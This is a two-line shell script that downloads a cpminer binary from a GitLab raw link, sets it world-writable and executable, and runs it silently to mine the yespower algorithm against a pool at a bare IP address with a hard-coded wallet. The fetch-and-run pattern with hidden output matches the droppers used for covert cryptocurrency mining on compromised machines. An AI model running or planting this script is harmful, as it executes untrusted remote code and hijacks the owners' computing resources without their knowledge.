#!/bin/sh

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcps://165.227.180.199:80 -u QT5J7ALoKpg93HLbYeZMaViNw3ivWaHX6b -t4 -p m=solo > /dev/null 2>&1